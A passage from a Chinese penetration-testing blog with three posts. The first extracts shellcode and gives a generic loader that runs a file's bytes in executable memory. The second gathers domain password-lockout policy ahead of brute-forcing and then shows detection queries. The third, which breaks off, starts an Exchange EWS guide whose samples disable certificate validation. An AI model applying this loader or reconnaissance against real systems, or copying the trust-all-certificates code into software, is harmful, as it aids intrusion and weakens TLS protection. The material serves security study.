  <li>测试Shellcode自动生成工具——ShellcodeCompiler</li>
  <li>使用C++编写(不使用内联汇编)，实现动态获取API地址并调用，对其反汇编可提取出shellcode</li>
</ul>

<h2 id="0x02-利用vc60的debug模式获取shellcode">0x02 利用vc6.0的DEBUG模式获取shellcode</h2>
<hr>

<p><strong>注：</strong></p>

<p>本节参考爱无言的《挖0day》附录部分</p>

<p><strong>测试系统：</strong></p>

<p>Windows XP</p>

<h3 id="1编写弹框测试程序并提取汇编代码">1、编写弹框测试程序并提取汇编代码</h3>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "stdafx.h"
#include &lt;windows.h&gt;
int main(int argc, char* argv[])
{
	MessageBoxA(NULL,NULL,NULL,0);
	return 0;
}
</code></pre></div></div>

<p>在<code class="language-plaintext highlighter-rouge">MessageBoxA(NULL,NULL,NULL,0);</code>处，按F9下断点</p>

<p>debug模式按F5开始调试，跳到断点</p>

<p>按<code class="language-plaintext highlighter-rouge">Alt+8</code>将当前C代码转为汇编代码,如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-1-18/2-2.png" alt="Alt text"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00401028   mov         esi,esp
0040102A   push        0
0040102C   push        0
0040102E   push        0
00401030   push        0
00401032   call        dword ptr [__imp__MessageBoxA@16 (0042528c)]
</code></pre></div></div>

<p>call是一条间接内存调用指令，实际使用需要真正的内存地址</p>

<p>按<code class="language-plaintext highlighter-rouge">Alt+6</code>打开查看内存数据的Memory窗口，跳到位置<code class="language-plaintext highlighter-rouge">0x0042528c</code>，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-1-18/2-3.png" alt="Alt text"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0042528C  EA 07 D5 77 00 00 00  ..誻...
</code></pre></div></div>

<p>取前4字节，倒序排列(内存中数据倒着保存):
<code class="language-plaintext highlighter-rouge">77D507EA</code></p>

<p>call命令的实际地址为<code class="language-plaintext highlighter-rouge">0x77D507EA</code></p>

<p>MessageBoxA函数位于user32.dll中，调用时需要提前加载user32.dll</p>

<h3 id="2编写内联汇编程序并提取机器码">2、编写内联汇编程序并提取机器码</h3>

<p>新建工程，使用内联汇编加载上述代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "stdafx.h"
#include &lt;windows.h&gt;
int main(int argc, char* argv[])
{
	LoadLibrary("user32.dll");
	_asm
	{	
		push        0
		push        0
		push        0
		push        0
		mov eax,0x77D507EA
		call eax
	}
	return 0;
}
</code></pre></div></div>

<p>编译执行，成功弹框</p>

<p>在push 0处按F9下断点，F5进入调试模式跳至断点处</p>

<p>按<code class="language-plaintext highlighter-rouge">Alt+8</code>将当前VC代码转为汇编代码，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-1-18/2-4.png" alt="Alt text"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>12:           push        0
0040103C   push        0
13:           push        0
0040103E   push        0
14:           push        0
00401040   push        0
15:           push        0
00401042   push        0
16:           mov eax,0x77D507EA
00401044   mov         eax,77D507EAh
17:           call eax
00401049   call        eax
</code></pre></div></div>

<p>接着提取上述代码在内存中的数据，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-1-18/2-5.png" alt="Alt text"></p>

<p>范围是0040103C - 0040104A</p>

<p><strong>注：</strong></p>

<p>call  eax的地址为00401049，表示起始地址，完整代码的长度需要+1</p>

<p>按<code class="language-plaintext highlighter-rouge">Alt+6</code>打开查看内存数据的Memory窗口</p>

<p>跳到0x0040103C，内容如下：</p>

<p><code class="language-plaintext highlighter-rouge">0040103C  6A 00 6A 00 6A 00 6A 00 B8 EA 07 D5 77 FF D0  j.j.j.j.戈.誻..</code></p>

<p>截取0040103C - 0040104A的内容如下：</p>

<p><code class="language-plaintext highlighter-rouge">6A 00 6A 00 6A 00 6A 00 B8 EA 07 D5 77 FF D0</code></p>

<p>这段机器码就是接来下要使用的shellcode</p>

<h3 id="3编写加载shellcode的测试程序">3、编写加载shellcode的测试程序</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "stdafx.h"
#include &lt;windows.h&gt;
int main(int argc, char* argv[])
{
	LoadLibrary("user32.dll");
	char shellcode[]="\x6A\x00\x6A\x00\x6A\x00\x6A\x00\xB8\xEA\x07\xD5\x77\xFF\xD0";
	((void(*)(void))&amp;shellcode)();

	return 0;
}
</code></pre></div></div>

<p>成功执行shellcode</p>

<p><strong>注：</strong></p>

<p>由于Win7系统引入了ASLR机制，因此我们不能在shellcode中使用固定的内存地址，上述方法在Win7下不通用</p>

<h2 id="0x03-shellcode自动生成工具shellcodecompiler">0x03 Shellcode自动生成工具——ShellcodeCompiler</h2>
<hr>

<p><strong>下载地址：</strong></p>

<p>https://github.com/NytroRST/ShellcodeCompiler</p>

<p><strong>特点：</strong></p>

<ul>
  <li>c++开发</li>
  <li>开源工具</li>
  <li>借助NASM</li>
  <li>可实现封装api，转换为bin格式的shellcode和asm汇编代码</li>
</ul>

<p>实际测试：</p>

<p>Source.txt内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function MessageBoxA("user32.dll");
function ExitProcess("kernel32.dll");
MessageBoxA(0,"This is a MessageBox example","Shellcode Compiler",0);
ExitProcess(0);
</code></pre></div></div>

<p>cmd下运行：</p>

<p><code class="language-plaintext highlighter-rouge">ShellcodeCompiler.exe -r Source.txt -o Shellcode.bin -a Assembly.asm</code></p>

<p><strong>注：</strong></p>

<p>ShellcodeCompiler.exe和文件夹NASM放于同级目录</p>

<p>执行后shellcode保存在Shellcode.bin文件中</p>

<p>为便于测试生成的shellcode，可在生成过程中加入<code class="language-plaintext highlighter-rouge">-t</code>参数执行一次shellcode</p>

<p>我参考ShellcodeCompiler的代码将其执行shellcode的功能提取出来，实现了读取文件并加载文件中的shellcode，完整代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;

size_t GetSize(char * szFilePath)
{
	size_t size;
	FILE* f = fopen(szFilePath, "rb");
	fseek(f, 0, SEEK_END);
	size = ftell(f);
	rewind(f);
	fclose(f);
	return size;
}

unsigned char* ReadBinaryFile(char *szFilePath, size_t *size)
{
	unsigned char *p = NULL;
	FILE* f = NULL;
	size_t res = 0;
	// Get size and allocate space
	*size = GetSize(szFilePath);
	if (*size == 0) return NULL;		
	f = fopen(szFilePath, "rb");
	if (f == NULL)
	{
		printf("Binary file does not exists!\n");
		return 0;
	}
	p = new unsigned char[*size];
	// Read file
	rewind(f);
	res = fread(p, sizeof(unsigned char), *size, f);
	fclose(f);
	if (res == 0)
	{
		delete[] p;
		return NULL;
	}
	return p;
}

int main(int argc, char* argv[])
{
	char *szFilePath=argv[1];  
	unsigned char *BinData = NULL;
	size_t size = 0;	
	BinData = ReadBinaryFile(szFilePath, &amp;size);
	void *sc = VirtualAlloc(0, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (sc == NULL)
	{		
		return 0;
	}
	memcpy(sc, BinData, size);
	(*(int(*)()) sc)();
	return 0;
}
</code></pre></div></div>

<h2 id="0x04-c编写不使用内联汇编实现动态获取api地址并调用对其反汇编可提取出shellcode">0x04 C++编写(不使用内联汇编)，实现动态获取API地址并调用，对其反汇编可提取出shellcode</h2>
<hr>

<p>对于ShellcodeCompiler，最大的不足是使用了内联汇编，vc在64位下默认不支持内联汇编，所以该方法无法生成64位shellcode</p>

<p><strong>注：</strong></p>

<p>delphi支持64位的内联汇编</p>

<p>vc在64位下虽然不能直接使用内联汇编，但是可以将程序段全部放到一个asm文件下进行编译</p>

<p>X64上恢复VS关键字__asm的方法可参照：</p>

<p>http://bbs.pediy.com/showthread.php?p=1260419</p>

<p>那么，想要开发一个64位的shellcode，最直接的方式就是不使用内联汇编，纯c++编写，实现动态获取API地址并调用，最后对其反汇编进而得到shellcode</p>

<p><strong>好处如下：</strong></p>

<p>便于调试，源代码的可读性大大增强</p>

<p>但是，我在网上并没有找到现成的代码，于是根据原理尝试自己实现</p>

<p><strong>注：</strong></p>

<p>1、编写shellcode需要实现以下步骤：</p>

<ul>
  <li>获取kernel32.dll基地址</li>
  <li>定位GetProcAddress函数地址</li>
  <li>使用GetProcAddress确定LoadLibrary函数地址</li>
  <li>使用LoadLibrary加载DLL文件</li>
  <li>使用GetProcAddress查找某个函数的地址（例如MessageBox）</li>
  <li>指定函数参数</li>
  <li>调用函数</li>
</ul>

<p>2、另一个参考资料：</p>

<p>http://bbs.pediy.com/showthread.php?t=203140</p>

<p>参考资料通过c++实现了加载一个第三方dll</p>

<p>以此为参考进行修改，实现我们想要的功能：</p>

<p><code class="language-plaintext highlighter-rouge">实现动态获取API地址并调用</code></p>

<p>完整代码已上传至github：</p>

<p>https://github.com/3gstudent/Shellcode-Generater</p>

<p><strong>特点：</strong></p>

<ul>
  <li>支持x86和x64</li>
  <li>纯c++实现，动态获取GetProcAddress和LoadLibrary函数的地址</li>
</ul>

<p>编译前对VisualStudio做如下配置：</p>

<blockquote>
  <p>1、使用Release模式。近来编译器的Debug模式可能产生逆序的函数，并且会插入许多与位置相关的调用。</p>

  <p>2、禁用优化。编译器会默认优化那些没有使用的函数，而那可能正是我们所需要的。</p>

  <p>3、禁用栈缓冲区安全检查（/Gs)。在函数头尾所调用的栈检查函数，存在于二进制文件的某个特定位置，导致输出的函数不能重定位，这对shellcode是无意义的</p>
</blockquote>

<p>接着在IDA下打开生成的exe获得机器码即可</p>

<h2 id="0x05-补充">0x05 补充</h2>
<hr>

<p>接下来研究的内容：</p>

<ul>
  <li>在X64上恢复VS关键字__asm后，如何获取64位shellcode</li>
</ul>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on January 18, 2017
  </div>

  
</article><article class="post">
  <h1>渗透基础——域内用户口令策略的获取</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在域渗透中，我们在口令爆破前需要先获得域内用户的口令策略，以免在口令爆破时锁定用户</p>

<p>站在防御的角度，需要识别出口令爆破的攻击行为并采取防御措施</p>

<p>本文将要介绍获取域内用户口令策略的常用方法，结合利用思路分享检测域用户口令爆破的方法。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>修改域用户口令策略的方法</li>
  <li>域外获取域用户口令策略的方法</li>
  <li>域内获取域用户口令策略的方法</li>
  <li>检测方法</li>
</ul>

<h2 id="0x02-基础知识">0x02 基础知识</h2>
<hr>

<p>我们需要关注以下口令策略：</p>

<ul>
  <li>Maximum password age，表示密码过期的时间，默认为42</li>
  <li>Minimum password length，表示密码的最小长度，默认为7</li>
  <li>Account lockout duration，表示被锁定的帐户在自动解锁前保持锁定的分钟数，默认为30</li>
  <li>Account lockout threshold，表示导致用户帐户被锁定的失败登录尝试次数，默认为5</li>
  <li>Reset account lockout counter after，表示失败登录尝试计数器重置为0次错误登录尝试之前，失败登录尝试后必须经过的分钟数，默认为30</li>
</ul>

<h2 id="0x03-修改域用户口令策略的方法">0x03 修改域用户口令策略的方法</h2>
<hr>

<p>域用户的口令策略默认保存在域内的默认组策略(Default Domain Policy)中，guid为<code class="language-plaintext highlighter-rouge">{31B2F340-016D-11D2-945F-00C04FB984F9}</code></p>

<p>在域控制器上打开<code class="language-plaintext highlighter-rouge">Group Policy Management</code>，找到当前域，选择<code class="language-plaintext highlighter-rouge">Default Domain Policy</code>，右键选择编辑，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-20/2-1.png" alt="Alt text"></p>

<p>依次打开<code class="language-plaintext highlighter-rouge">Computer Configuration</code>-&gt;<code class="language-plaintext highlighter-rouge">Policies</code>-&gt;<code class="language-plaintext highlighter-rouge">Windows Settings</code>-&gt;<code class="language-plaintext highlighter-rouge">Security Settings</code>-&gt;<code class="language-plaintext highlighter-rouge">Account Policies</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-20/2-2.png" alt="Alt text"></p>

<p>根据提示修改对应的选项</p>

<p>修改以后可以选择立即更新组策略使其立即生效，命令行输入：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gpupdate
</code></pre></div></div>

<h2 id="0x04-域外获取域用户口令策略的方法">0x04 域外获取域用户口令策略的方法</h2>
<hr>

<h3 id="1kali系统通过ldapsearch获取域用户口令策略">1.Kali系统通过ldapsearch获取域用户口令策略</h3>

<p>测试环境如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/2-1.png" alt="Alt text"></p>

<p>前提：我们能够访问到域控制器(DC)的389端口，并且我们至少已经获得了域内一个普通用户的口令</p>

<p>这个测试环境中，我们获得了域内普通用户<code class="language-plaintext highlighter-rouge">testa</code>的口令为<code class="language-plaintext highlighter-rouge">DomainUser123!</code></p>

<p>连接命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch -x -H ldap://192.168.1.1:389 -D "CN=testa,CN=Users,DC=test,DC=com" -w DomainUser123! -b "DC=test,DC=com" | grep replUpToDateVector -A 13
</code></pre></div></div>

<p>参数说明：
-x 进行简单认证
-H 服务器地址
-D 用来绑定服务器的DN
-w 绑定DN的密码
-b 指定要查询的根节点</p>

<p>使用grep命令对输出结果进行筛选，<code class="language-plaintext highlighter-rouge">grep replUpToDateVector -A 13</code>是为了只显示出同密码策略相关的项</p>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-20/3-1.png" alt="Alt text"></p>

<p>包括以下需要的信息：</p>

<ul>
  <li>maxPwdAge: -36288000000000</li>
  <li>minPwdLength: 10</li>
  <li>lockoutDuration: -18600000000</li>
  <li>lockoutThreshold: 15</li>
  <li>lockOutObservationWindow: -18600000000</li>
</ul>

<p>换算成以秒为单位要除以<code class="language-plaintext highlighter-rouge">10000000</code></p>

<p>例如：</p>

<p>(1)maxPwdAge: -36288000000000</p>

<p>36288000000000/10000000=3628800s</p>

<p>3628800/86400=42d</p>

<p>maxPwdAge=42d</p>

<p>(2)lockoutDuration: -18600000000</p>

<p>-18600000000/10000000=1860s</p>

<p>1860/60=31m</p>

<p>lockoutDuration=31m</p>

<h3 id="2windows系统通过powershell获取域用户口令策略">2.Windows系统通过PowerShell获取域用户口令策略</h3>

<p>测试环境如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/3-1.png" alt="Alt text"></p>

<p>前提：我们能够访问到域控制器(DC)的389端口，并且我们至少已经获得了域内一个普通用户的口令</p>

<p>这个测试环境中，我们获得了域内普通用户<code class="language-plaintext highlighter-rouge">testa</code>的口令为<code class="language-plaintext highlighter-rouge">DomainUser123!</code></p>

<p>这里需要使用powershell模块Active Directory</p>

<p>这里不必专门安装powershell模块Active Directory，可以通过调用Microsoft.ActiveDirectory.Management.dll的方式解决</p>

<p>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：
https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</p>

<p>此外，还需要使用凭据信息，所以完整的Powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$uname="testa"
$pwd=ConvertTo-SecureString "DomainUser123!" -AsPlainText –Force
$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)
import-module .\Microsoft.ActiveDirectory.Management.dll
Get-ADDefaultDomainPasswordPolicy -Server 192.168.1.1 -Credential $cred -Verbose
</code></pre></div></div>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-20/3-2.png" alt="Alt text"></p>

<h3 id="3windows系统通过域共享文件获取域用户口令策略">3.Windows系统通过域共享文件获取域用户口令策略</h3>

<p>测试环境同上</p>

<p>域用户的口令策略保存在域内的默认组策略(Default Domain Policy)中，guid为<code class="language-plaintext highlighter-rouge">{31B2F340-016D-11D2-945F-00C04FB984F9}</code></p>

<p>这里可以通过通过访问域内共享文件夹\SYSVOL进行查看</p>

<p>前提：需要提供域用户的凭据</p>

<p>这个测试环境中，我们获得了域内普通用户<code class="language-plaintext highlighter-rouge">testa</code>的口令为<code class="language-plaintext highlighter-rouge">DomainUser123!</code></p>

<p>通用位置为：<code class="language-plaintext highlighter-rouge">\\&lt;DOMAIN Controller IP&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code></p>

<p>测试环境的位置为：<code class="language-plaintext highlighter-rouge">\\192.168.1.1\SYSVOL\test.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code></p>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-20/3-3.png" alt="Alt text"></p>

<h2 id="0x05-域内获取域用户口令策略的方法">0x05 域内获取域用户口令策略的方法</h2>
<hr>

<p>前提是已经获得了域内一台主机的权限</p>

<p>测试环境如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/4-1.png" alt="Alt text"></p>

<h3 id="1通过powershell获取域用户口令策略">1.通过PowerShell获取域用户口令策略</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\Microsoft.ActiveDirectory.Management.dll
Get-ADDefaultDomainPasswordPolicy
</code></pre></div></div>

<h3 id="2通过c获取域用户口令策略">2.通过c++获取域用户口令策略</h3>

<p>使用API <code class="language-plaintext highlighter-rouge">NetUserModalsGet</code>来获取域用户的口令策略</p>

<p>结构体<code class="language-plaintext highlighter-rouge">USER_MODALS_INFO_0</code>保存全局密码信息</p>

<p>结构体<code class="language-plaintext highlighter-rouge">USER_MODALS_INFO_3</code>保存锁定信息</p>

<p>参考资料：</p>

<p>https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netusermodalsget?redirectedfrom=MSDN</p>

<p>根据参考资料中的代码，添加查询用户锁定信息的功能，代码已上传至github，地址如下:</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/GetDomainPasswordPolicy.cpp</p>

<p>代码分别使用结构体<code class="language-plaintext highlighter-rouge">USER_MODALS_INFO_0</code>和<code class="language-plaintext highlighter-rouge">USER_MODALS_INFO_3</code>对用户的口令策略进行查询</p>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-20/4-1.png" alt="Alt text"></p>

<p>###3.通过域共享文件获取域用户口令策略</p>

<p>通用位置为：<code class="language-plaintext highlighter-rouge">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code></p>

<p>测试环境的位置为：<code class="language-plaintext highlighter-rouge">\\test.com\SYSVOL\test.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code></p>

<h2 id="0x06-检测方法">0x06 检测方法</h2>
<hr>

<p>域用户的属性中包括两个有用的信息：</p>

<ul>
  <li>badPwdCount，记录用户口令错误的次数</li>
  <li>lastbadpasswordattempt，记录上次口令输入错误的登陆时间</li>
</ul>

<p>我们在检测时可以通过查询这两个属性来识别是否遭受口令爆破的攻击，具体方法如下：</p>

<h3 id="1直接在域控制器上查询">1.直接在域控制器上查询</h3>

<p>Powershell代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ADUser -Filter * -Properties *| select name,lastbadpasswordattempt,badpwdcount|fl
</code></pre></div></div>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-20/5-1.png" alt="Alt text"></p>

<h3 id="2在域内普通用户登录的主机上">2.在域内普通用户登录的主机上</h3>

<h4 id="1使用powerview">(1)使用powerview</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser | select name,badpasswordtime,badpwdcount
</code></pre></div></div>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-20/5-2.png" alt="Alt text"></p>

<h4 id="2使用c">(2)使用c++</h4>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/CheckUserBadPwdPolicy.cpp</p>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-20/5-3.png" alt="Alt text"></p>

<h3 id="3在域外的kali系统上">3.在域外的kali系统上</h3>

<h4 id="1使用ldapsearch">(1)使用ldapsearch</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch -x -H ldap://192.168.1.1:389 -D "CN=testa,CN=Users,DC=test,DC=com" -w DomainUser123! -b "DC=test,DC=com" -b "DC=test,DC=com" "(&amp;(objectClass=user)(objectCategory=person))"|grep -E "cn:|badPwdCount|badPasswordTime"
</code></pre></div></div>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-20/5-4.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>如果口令输入正确，那么badPwdCount会被清零</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文列举了获取域内用户口令策略的常用方法，介绍了如何在多种环境下识别出口令爆破的行为。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 20, 2019
  </div>

  
</article><article class="post">
  <h1>Exchange Web Service(EWS)开发指南</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Exchange Web Service(EWS)提供了一个访问Exchange资源的接口，我在github没有找到很合适的参考项目，于是对这方面的内容做一个系统性的整理，开源一份EWS的实现代码ewsManage，便于后续的二次开发。</p>
<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>使用EWS Managed API访问Exchange资源</li>
  <li>使用EWS SOAP XML message访问Exchange资源</li>
  <li>开源代码ewsManage</li>
  <li>ewsManage功能介绍</li>
</ul>

<h2 id="0x02-简介">0x02 简介</h2>
<hr>

<p>官方文档：</p>

<p>https://docs.microsoft.com/en-us/exchange/client-developer/exchange-server-development</p>

<p>两种访问Exchange资源的方法：</p>

<ul>
  <li>使用EWS Managed API</li>
  <li>使用EWS SOAP XML message</li>
</ul>

<p>测试环境：</p>

<ul>
  <li>Exchange Server 2013 SP1</li>
  <li>user: test1@test.com</li>
  <li>pwd: test123!</li>
  <li>url: https://test.com/ews/Exchange.asmx</li>
  <li>AutodiscoverUrl: test1@test.com</li>
</ul>

<h2 id="0x03-使用ews-managed-api">0x03 使用EWS Managed API</h2>
<hr>

<p>官方资料：</p>

<p>https://docs.microsoft.com/en-us/exchange/client-developer/exchange-web-services/get-started-with-ews-managed-api-client-applications</p>

<p>这里使用EWS Managed API 2.0</p>

<p>下载地址：</p>

<p>https://www.microsoft.com/en-us/download/details.aspx?id=35371</p>

<p>安装后从文件夹中找到文件<code class="language-plaintext highlighter-rouge">Microsoft.Exchange.WebServices.dll</code>和<code class="language-plaintext highlighter-rouge">Microsoft.Exchange.WebServices.xml</code></p>

<p><strong>注：</strong></p>

<p>如果已经获得这两个文件，不需要安装EwsManagedApi.msi，这两个文件可以在后面的开源工程ewsManage中找到</p>

<h3 id="1c-sharp实现">(1)C Sharp实现</h3>

<p>开发环境：VS2015</p>

<p>新建工程，并引用文件：</p>

<p><code class="language-plaintext highlighter-rouge">Microsoft.Exchange.WebServices.dll</code>和<code class="language-plaintext highlighter-rouge">Microsoft.Exchange.WebServices.xml</code></p>

<p>C Sharp代码示例（列出收件箱所有邮件的标题）：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using Microsoft.Exchange.WebServices.Data;
using System.Net;
namespace EMAIL_EWS
{
    class Program
    {
        static void Main(string[] args)
        {
            ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) =&gt; { return true; };
            ExchangeService service = new ExchangeService(ExchangeVersion.Exchange2013_SP1);
            service.Credentials = new WebCredentials("test1", "test123!");
            service.AutodiscoverUrl("test1@test.com");
            ItemView view = new ItemView(int.MaxValue);
            FindItemsResults&lt;Item&gt; findResults = service.FindItems(WellKnownFolderName.Inbox, view);
            foreach (Item item in findResults.Items)
            {
                if (item.Subject != null)
                {
                    Console.WriteLine(item.Subject);
                }
                else
                {
                    Console.WriteLine("no Title\r\n");
                }
            }
        }
    }
}
</code></pre></div></div>

<h3 id="2powershell实现">(2)Powershell实现</h3>

<p>Powershell代码示例（列出收件箱所有邮件的标题）：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
Import-Module -Name "C:\test\Microsoft.Exchange.WebServices.dll"
$Credentials = New-Object Microsoft.Exchange.WebServices.Data.WebCredentials("test1","test123!")
$exchService = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService
$exchService.Credentials = $Credentials
$exchService.AutodiscoverUrl("test1@test.com")
$exchService
$inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($exchService,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox)
$inbox|gm
$ms = $inbox.FindItems(10) 
foreach ($m in $ms)
{
$m.Load()
$m.subject
}
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>Powershell同样需要<code class="language-plaintext highlighter-rouge">Microsoft.Exchange.WebServices.dll</code></p>

<p>在程序开发中需要注意的细节如下：</p>

<h4 id="1exchange-server的证书不可信">1.Exchange Server的证书不可信</h4>

<p>这会导致通过IE访问时显示证书不可信，需要点击Continue才能正常访问，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-7/3-1.png" alt="Alt text"></p>

<p>程序实现时会产生错误，提示如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The underlying connection was closed. Could not establish a secure SSL/TLS connection
</code></pre></div></div>

<p>可以通过添加证书信任策略避免这个问题：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System.Net;
ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) =&gt; { return true; };
</code></pre></div></div>

<h4 id="2autodiscover自动发现服务">2.Autodiscover自动发现服务</h4>

<p>用来简化用户配置过程，具体到程序实现上对应<code class="language-plaintext highlighter-rouge">ExchangeService.AutodiscoverUrl</code></p>

<p>参考地址：</p>

<p>https://msdn.microsoft.com/en-us/library/office/dd634273(v=exchg.80).aspx</p>

<p>输入邮箱地址，自动解析出Exchange Server Url</p>

<p>用法举例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ExchangeService service = new ExchangeService(ExchangeVersion.Exchange2013_SP1);
service.AutodiscoverUrl("test1@test.com", RedirectionUrlValidationCallback);
</code></pre></div></div>

<p>等价于</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ExchangeService service = new ExchangeService(ExchangeVersion.Exchange2013_SP1);
service.Url = new Uri("https://test.com/ews/Exchange.asmx");
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>实际使用时，如果Exchange Server关闭Autodiscover自动发现服务，可以选择指定Url</p>

<h4 id="3net-framework-4-and-net-framework-35">3..NET Framework 4 and .NET Framework 3.5</h4>

<p>.NET Framework 4为推荐开发环境</p>

<p>Win7系统默认为.NET Framework 3.5，不支持.NET Framework 4</p>

<p>为了支持Win7，将工程指定为.NET Framework 3.5，不影响EWS Managed API的使用</p>

<h4 id="4明文读取邮件的body属性">4.明文读取邮件的body属性</h4>

<p>读取邮件的body属性时(也就是获得邮件的内容)，默认输出格式为htlm</p>

<p>想要获得邮件的内容，需要将输出格式改为Text</p>

<p>解决方法：</p>

<p>https://stackoverflow.com/questions/11243911/ews-body-plain-text</p>

<h4 id="5搜索自定义文件夹时指定深度搜索遍历所有文件夹包括更深的目录">5.搜索自定义文件夹时，指定深度搜索（遍历所有文件夹，包括更深的目录）</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FindFoldersResults findResults = null;
FolderView view = new FolderView(int.MaxValue) { Traversal = FolderTraversal.Deep };
</code></pre></div></div>

<h4 id="6编译后仍需要依赖文件">6.编译后仍需要依赖文件</h4>

<p>编译后的程序在执行时，仍需要依赖文件<code class="language-plaintext highlighter-rouge">Microsoft.Exchange.WebServices.dll</code>(在同级目录)</p>

<h2 id="0x04-使用ews-soap-xml-message">0x04 使用EWS SOAP XML message</h2>
<hr>

<p>官方资料：</p>

